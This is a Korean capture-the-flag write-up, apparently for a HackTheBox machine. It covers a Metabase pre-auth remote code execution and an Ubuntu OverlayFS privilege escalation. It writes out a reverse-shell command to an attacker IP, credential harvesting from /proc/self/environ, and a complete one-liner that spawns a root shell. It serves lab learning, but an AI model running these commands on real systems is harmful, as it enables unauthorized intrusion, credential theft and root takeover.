### 사용한 취약점: metabase 원격 코드 실행, 우분투 커널 취약점(권한 상승)
### 초기 침투

- metabase 로그인 페이지를 찾음
  - metabase: 오픈 소스 business intelligence tool
  - 임의 코드 실행 취약점을 이용
### exploit
- 사용한 exploit code: https://github.com/m3m0o/metabase-pre-auth-rce-poc/blob/main/main.py
- python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]" 다음과 같은 형태로 실행
  - exploit 하기 위해 data.analytics.htb/api/session/properties 에서 setup-token 값을 읽는다
    - 인증 없이도 액세스 가능한 경우가 많음
  - db 연결을 검증하는 setup-token과 함께 사용할 수 있는 api 엔드포인트를 찾음
  - h2 db 드라이버에서 sql 주입 취약점을 발견
  - db 유효성 검사 단계를 조작하여 임의의 코드 실행
<br></br>
- 해당 토큰과 url, exploit code를 실행하여 전달하고 reverse shell을 얻는다
- python3 main.py -u http://data.analytical.htb -t <토큰 값> -c "bash -i >& /dev/tcp/<ip값>/4444 0>&1"
- proc/self/environ 에서 meat user id와 meta password 값을 찾아 ssh로 접속을 시도 한다.
- user flag 값을 얻을 수 있다.

### 권한 상승
- sudo -l: 실행 안됨
- uname -a: 시스템 커널 과 하드웨어 정보를 확인하여 권한 상승할 정보를 찾는다
<br></br>

- 사용한 방법으로는 우분투 커널 취약점을 이용하여 권한 상승을 시도한다.
  - 사용한 exploit code
  - 해당 명령은 home 디렉터리나 상위 디렉터리에서 실행이 불가
  - 하위 폴더에서 실행해야 함
<br></br>
- 권한 상승 원리
  - overlayFS: 하나의 디렉터리 트리가 다른 디렉터리 트리 위에 겹쳐지는 통합 마운트 파일 시스템
    - 모든 수정 사항이 쓰기 가능한 상위 계층으로 이동, 하위 계층은 읽기 전용
  - 하위 파일을 상위 계층으로 이동하여 공격함
  - 즉 하위 디렉터리에 CAP_SETUID 같은 기능을 상위 계층으로 전달하여 실행하고 루트 권한을 얻는 원리
```
unshare -rm sh -c
"mkdir l u w m &&
cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" &&
u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```
  - unshare -rm sh: 새 사용자 네임스페이스 생성 후 새 파일 시스템 네임 스페이스를 마운트 함
  - mkdir l u w m: 각 이름의 디렉터리 생성
  - cp /u*/b*/p*3 l/: 각 패턴에 맞는 파일 복사
  - setcap cap_setuid+eip l/python3: l에 있는 python3 바이너리에 eip플래그와 함께 cap_setuid를 설정하여 권한을 상승시킴
  - mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m: overlay 파일 시스템을 overlay 파일시스템 타입을 이용하여 마운트 함
    - l은 lower layer, w는 work directory, m은 mount point, u는 upper layer로 지정\
  - touch m/*: m 디렉터리에 빈 폴더 생성
<br></br>
- u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")': 명령은 u에 있는 python3 디렉터리(overlay 파일시스템 상위 계층)에서 실행됨
  - root 권한으로 bash shell을 획득 함
- 권한을 얻고 /root/root.txt에 있는 플래그 값을 읽는다.

### 결론
- metabase 취약점
  - db 유효성 검증 단계에서 sql injection을 하여 reverse shell 획득
- 커널 취약점을 이용한 권한 상승
  - namespace 생성
  - namespace-root가 마운트 된 디렉터리에 overlayFS 생성
  - lower layer 파이썬 바이너리에 CAP_SETUID 설정
  - namespace-root가 상위 계층에 파이썬 바이너리를 push함
  - 상위 계층에서 파이썬을 실행하여 루트 권한을 획득
